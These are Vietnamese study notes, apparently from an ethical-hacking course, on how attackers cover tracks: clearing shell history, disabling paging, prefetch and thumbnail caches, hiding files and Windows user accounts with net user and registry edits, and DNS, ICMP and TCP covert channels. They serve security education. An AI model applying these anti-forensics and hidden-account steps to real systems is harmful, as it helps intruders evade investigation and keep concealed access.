    Chỉ xóa lịch sử của shell hiện tại: history -c
    Xóa hoàn toàn lịch sử và lưu lại thay đổi: history -w
...
- **Disable Hibernation & Virtual Memory:** Tránh để mật khẩu dạng rõ lọt vào các file `hiberfil.sys` hoặc `pagefile.sys` (Paging file) khi RAM xả bộ nhớ xuống đĩa.
  - Vô hiệu hóa Virtual Memory (Paging File): Ngăn chặn lưu trữ mật khẩu bản rõ tạm thời. (Mở Control Panel -> System -> Advanced system settings -> Tab Advanced -> Nút Settings dưới Performance -> Tab Advanced -> Change dưới Virtual Memory -> Chọn No paging file -> Set).
- **Disable Restore Points & Prefetch/Thumbnail Cache:** Xóa điểm khôi phục, tắt SysMain (Superfetch) để không lưu lịch sử thực thi app, xóa bộ nhớ đệm hình ảnh (`thumbs.db`).
  - Vô hiệu hóa Thumbnail Cache: Ngăn chặn tiết lộ hình ảnh đã xóa qua tệp thumbs.db. (Dùng GPO gpedit.msc -> User Configuration -> Administrative Templates -> Windows Components -> File Explorer -> Bật tính năng Turn off the caching of thumbnails in hidden thumbs.db files).
  - Vô hiệu hóa Prefetch Feature: Ngăn chặn việc tạo bằng chứng về các phần mềm độc hại đã thực thi (Prefetch files). (Mở services.msc -> Tìm dịch vụ SysMain (Superfetch) -> Chuyển Startup type thành Disabled).
- **Xóa Dấu vết Trực tuyến (Clearing Online Tracks & DNS Cache) (Trang 957-961, 981-982):**
  ...
  - **Các hoạt động xóa dấu vết trên trình duyệt (Browser Activities):** Kẻ tấn công thường xóa dấu vết trực tuyến bằng cách sử dụng tính năng duyệt web ẩn danh (Private browsing), xóa dữ liệu trong trình quản lý mật khẩu, xóa lịch sử thanh địa chỉ, xóa các phiên đã lưu, xóa JavaScript của người dùng, xóa dữ liệu cá nhân, xóa cookie và bộ nhớ cache khi thoát, xóa tệp tải xuống, tắt AutoComplete, và xóa danh sách sử dụng gần đây nhất (MRU - Most Recently Used).
...
- **Hiding Artifacts (Windows/Linux/Mac):**
  - _Windows:_ Dùng lệnh `attrib +h +s +r <FolderName>`. Giấu tài khoản người dùng thông qua việc thêm phím `$` vào tài khoản và sửa đổi nhánh Registry `Winlogon\SpecialAccounts\UserList`.
    - **Hiding Users in Windows (Ẩn người dùng):** Kẻ tấn công có thể tạo một tài khoản người dùng ẩn trên hệ thống bằng lệnh: `net user <UserName> /add`
      Sau đó, khi không cần sử dụng, chúng vô hiệu hóa và ẩn tài khoản này khỏi màn hình đăng nhập bằng lệnh: `net user <UserName> /active:no` (và gõ `net user <UserName> /active:yes` để bật lại).
    - **Hiding User Accounts (Ẩn tài khoản qua Registry):** Tạo một khóa DWORD trùng với tên tài khoản tại đường dẫn `HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList` và đặt giá trị là `0`.
...
- **DNS Tunneling & ICMP Tunnels:** Đóng gói (encapsulate) TCP payload vào bên trong các gói DNS query/reply hoặc ICMP echo request để tuồn dữ liệu ra ngoài (exfiltrate) xuyên qua tường lửa.
  - **Sử dụng các tham số TCP (Using TCP Parameters):** Kẻ tấn công có thể sử dụng các tham số TCP để phân phối payload và tạo kênh bí mật (covert channels). Các trường TCP mà dữ liệu có thể được ẩn vào bao gồm:
    - Trường nhận dạng IP (IP Identification field)
    - Số xác nhận TCP (TCP acknowledgement number)
    - Số thứ tự TCP ban đầu (TCP initial sequence number)
